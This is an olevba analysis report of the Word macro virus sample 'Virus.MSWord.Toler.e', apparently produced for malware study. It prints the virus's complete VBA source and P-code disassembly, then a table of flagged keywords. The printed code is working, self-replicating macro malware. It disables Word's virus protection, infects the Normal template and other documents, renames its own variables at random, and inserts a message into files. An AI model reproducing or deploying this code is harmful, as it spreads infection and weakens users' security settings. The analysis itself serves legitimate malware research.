olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Tolerance!
Private Type LvmfysxwZ
  MasewnZ As Integer
  WpvgaaZ As Integer
  IptjhZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim GlspfkZ As Object, VfatqnhZ As Object
  Set GlspfkZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set VfatqnhZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim JtptaotlZ As LvmfysxwZ, FhbbompbZ As LvmfysxwZ: JtptaotlZ = FtZ(GlspfkZ): FhbbompbZ = FtZ(VfatqnhZ)
  If FhbbompbZ.WpvgaaZ = 0 Then
     OmgqsfjZ GlspfkZ, VfatqnhZ, JtptaotlZ, FhbbompbZ
     Options.SaveNormalPrompt = False
  End If
  If (JtptaotlZ.WpvgaaZ = 0) Or ((FhbbompbZ.WpvgaaZ <> 0) And (JtptaotlZ.WpvgaaZ <> FhbbompbZ.WpvgaaZ)) Then
     OmgqsfjZ VfatqnhZ, GlspfkZ, FhbbompbZ, JtptaotlZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub OmgqsfjZ(MasewnZ As Object, YwdlZ As Object, FromP As LvmfysxwZ, ToP As LvmfysxwZ)
  Dim SarlZ As String, EjlhlZ
  SarlZ = MasewnZ.Lines(FromP.MasewnZ, FromP.WpvgaaZ)
  EjlhlZ = Array("SxZ", "LvmfysxwZ", "MasewnZ", "YwdlZ", "VmwvhnqZ", "WpvgaaZ", "IptjhZ", "GlspfkZ", "VfatqnhZ", "JtptaotlZ", "FhbbompbZ", "OmgqsfjZ", "SarlZ", "VifZ", "MxhmxvZ", "LnabcZ", "FtZ", "EctZ", "EjlhlZ")
  For I = 0 To 18: EctZ SarlZ, (EjlhlZ(I)), SxZ(SarlZ): Next I
  If ToP.IptjhZ Then YwdlZ.DeleteLines 1, YwdlZ.CountOfLines
  YwdlZ.AddFromString SarlZ
End Sub
Private Function SxZ(SarlZ As String) As String
  Dim VifZ As String: VifZ = ""
  While (InStr(SarlZ, VifZ) <> 0) Or (Len(VifZ) < 3)
     VifZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(VifZ) = 0 Then
                  VifZ = VifZ + Chr(Int(Rnd * 25 + 65))
            Else: VifZ = VifZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     VifZ = VifZ + "Z"
  Wend
  SxZ = VifZ
End Function
Private Sub EctZ(SarlZ As String, MxhmxvZ As String, LnabcZ As String)
  Dim I As Long
  I = 1
  While InStr(I, SarlZ, MxhmxvZ) <> 0
        I = InStr(I, SarlZ, MxhmxvZ)
        SarlZ = Left(SarlZ, I - 1) + LnabcZ + Mid$(SarlZ, I + Len(MxhmxvZ))
        Index = Index + 1
  Wend
End Sub
Private Function FtZ(VmwvhnqZ As Object) As LvmfysxwZ
  FtZ.MasewnZ = 0
  FtZ.WpvgaaZ = 0
  FtZ.IptjhZ = False
  For I = 1 To VmwvhnqZ.CountOfLines
   If VmwvhnqZ.Lines(I, 1) = "' Tolerance!" Then FtZ.MasewnZ = I
   If VmwvhnqZ.Lines(I, 1) = "End Function 'Tolerance!" Then FtZ.WpvgaaZ = I - FtZ.MasewnZ + 1
   If InStr(VmwvhnqZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then FtZ.IptjhZ = True
  Next I
End Function 'Tolerance!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Toler.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6144 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x000B " Tolerance!"
' Line #2:
' 	Type (Private) LvmfysxwZ
' Line #3:
' 	DimImplicit 
' 	VarDefn MasewnZ (As Integer)
' Line #4:
' 	DimImplicit 
' 	VarDefn WpvgaaZ (As Integer)
' Line #5:
' 	DimImplicit 
' 	VarDefn IptjhZ (As Boolean)
' Line #6:
' 	EndType 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub Document_Close())
' Line #9:
' Line #10:
' 	EndSub 
' Line #11:
' Line #12:
' 	FuncDefn (Private Sub Document_New())
' Line #13:
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub Document_Open())
' Line #17:
' 	ArgsCall Read 0x0000 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	Dim 
' 	VarDefn GlspfkZ (As Object)
' 	VarDefn VfatqnhZ (As Object)
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set GlspfkZ 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set VfatqnhZ 
' Line #22:
' 	Dim 
' 	VarDefn JtptaotlZ (As LvmfysxwZ)
' 	VarDefn FhbbompbZ (As LvmfysxwZ)
' 	BoS 0x0000 
' 	Ld GlspfkZ 
' 	ArgsLd FtZ 0x0001 
' 	St JtptaotlZ 
' 	BoS 0x0000 
' 	Ld VfatqnhZ 
' 	ArgsLd FtZ 0x0001 
' 	St FhbbompbZ 
' Line #23:
' 	Ld FhbbompbZ 
' 	MemLd WpvgaaZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld GlspfkZ 
' 	Ld VfatqnhZ 
' 	Ld JtptaotlZ 
' 	Ld FhbbompbZ 
' 	ArgsCall OmgqsfjZ 0x0004 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld JtptaotlZ 
' 	MemLd WpvgaaZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld FhbbompbZ 
' 	MemLd WpvgaaZ 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld JtptaotlZ 
' 	MemLd WpvgaaZ 
' 	Ld FhbbompbZ 
' 	MemLd WpvgaaZ 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #28:
' 	Ld VfatqnhZ 
' 	Ld GlspfkZ 
' 	Ld FhbbompbZ 
' 	Ld JtptaotlZ 
' 	ArgsCall OmgqsfjZ 0x0004 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #30:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	ElseIfBlock 
' Line #31:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertParagraphBefore 0x0000 
' Line #32:
' 	LitStr 0x0010 "MUD Forever! :-)"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Private Sub OmgqsfjZ(MasewnZ As Object, YwdlZ As Object, FromP As , ToP As ))
' Line #37:
' 	Dim 
' 	VarDefn SarlZ (As String)
' 	VarDefn EjlhlZ
' Line #38:
' 	Ld FromP 
' 	MemLd MasewnZ 
' 	Ld FromP 
' 	MemLd WpvgaaZ 
' 	Ld MasewnZ 
' 	ArgsMemLd Lines 0x0002 
' 	St SarlZ 
' Line #39:
' 	LitStr 0x0003 "SxZ"
' 	LitStr 0x0009 "LvmfysxwZ"
' 	LitStr 0x0007 "MasewnZ"
' 	LitStr 0x0005 "YwdlZ"
' 	LitStr 0x0008 "VmwvhnqZ"
' 	LitStr 0x0007 "WpvgaaZ"
' 	LitStr 0x0006 "IptjhZ"
' 	LitStr 0x0007 "GlspfkZ"
' 	LitStr 0x0008 "VfatqnhZ"
' 	LitStr 0x0009 "JtptaotlZ"
' 	LitStr 0x0009 "FhbbompbZ"
' 	LitStr 0x0008 "OmgqsfjZ"
' 	LitStr 0x0005 "SarlZ"
' 	LitStr 0x0004 "VifZ"
' 	LitStr 0x0007 "MxhmxvZ"
' 	LitStr 0x0006 "LnabcZ"
' 	LitStr 0x0003 "FtZ"
' 	LitStr 0x0004 "EctZ"
' 	LitStr 0x0006 "EjlhlZ"
' 	ArgsArray Array 0x0013 
' 	St EjlhlZ 
' Line #40:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0012 
' 	For 
' 	BoS 0x0000 
' 	Ld SarlZ 
' 	Ld I 
' 	ArgsLd EjlhlZ 0x0001 
' 	Paren 
' 	Ld SarlZ 
' 	ArgsLd SxZ 0x0001 
' 	ArgsCall EctZ 0x0003 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	Ld ToP 
' 	MemLd IptjhZ 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld YwdlZ 
' 	MemLd CountOfLines 
' 	Ld YwdlZ 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #42:
' 	Ld SarlZ 
' 	Ld YwdlZ 
' 	ArgsMemCall AddFromString 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Private Function SxZ(SarlZ As String, id_FFFE As String) As String)
' Line #45:
' 	Dim 
' 	VarDefn VifZ (As String)
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St VifZ 
' Line #46:
' 	Ld SarlZ 
' 	Ld VifZ 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld VifZ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	Paren 
' 	Or 
' 	While 
' Line #47:
' 	LitStr 0x0000 ""
' 	St VifZ 
' Line #48:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #49:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #50:
' 	Ld VifZ 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld VifZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St VifZ 
' Line #52:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld VifZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St VifZ 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	Ld VifZ 
' 	LitStr 0x0001 "Z"
' 	Add 
' 	St VifZ 
' Line #57:
' 	Wend 
' Line #58:
' 	Ld VifZ 
' 	St SxZ 
' Line #59:
' 	EndFunc 
' Line #60:
' 	FuncDefn (Private Sub EctZ(SarlZ As String, MxhmxvZ As String, LnabcZ As String))
' Line #61:
' 	Dim 
' 	VarDefn I (As Long)
' Line #62:
' 	LitDI2 0x0001 
' 	St I 
' Line #63:
' 	Ld I 
' 	Ld SarlZ 
' 	Ld MxhmxvZ 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #64:
' 	Ld I 
' 	Ld SarlZ 
' 	Ld MxhmxvZ 
' 	FnInStr3 
' 	St I 
' Line #65:
' 	Ld SarlZ 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld LnabcZ 
' 	Add 
' 	Ld SarlZ 
' 	Ld I 
' 	Ld MxhmxvZ 
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St SarlZ 
' Line #66:
' 	Ld Index 
' 	LitDI2 0x0001 
' 	Add 
' 	St Index 
' Line #67:
' 	Wend 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Function FtZ(VmwvhnqZ As Object, id_FFFE As ) As <crash>)
' Line #70:
' 	LitDI2 0x0000 
' 	Ld FtZ 
' 	MemSt MasewnZ 
' Line #71:
' 	LitDI2 0x0000 
' 	Ld FtZ 
' 	MemSt WpvgaaZ 
' Line #72:
' 	LitVarSpecial (False)
' 	Ld FtZ 
' 	MemSt IptjhZ 
' Line #73:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VmwvhnqZ 
' 	MemLd CountOfLines 
' 	For 
' Line #74:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld VmwvhnqZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "' Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld FtZ 
' 	MemSt MasewnZ 
' 	EndIf 
' Line #75:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld VmwvhnqZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0018 "End Function 'Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld FtZ 
' 	MemLd MasewnZ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld FtZ 
' 	MemSt WpvgaaZ 
' 	EndIf 
' Line #76:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld VmwvhnqZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld FtZ 
' 	MemSt IptjhZ 
' 	EndIf 
' Line #77:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000A "Tolerance!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

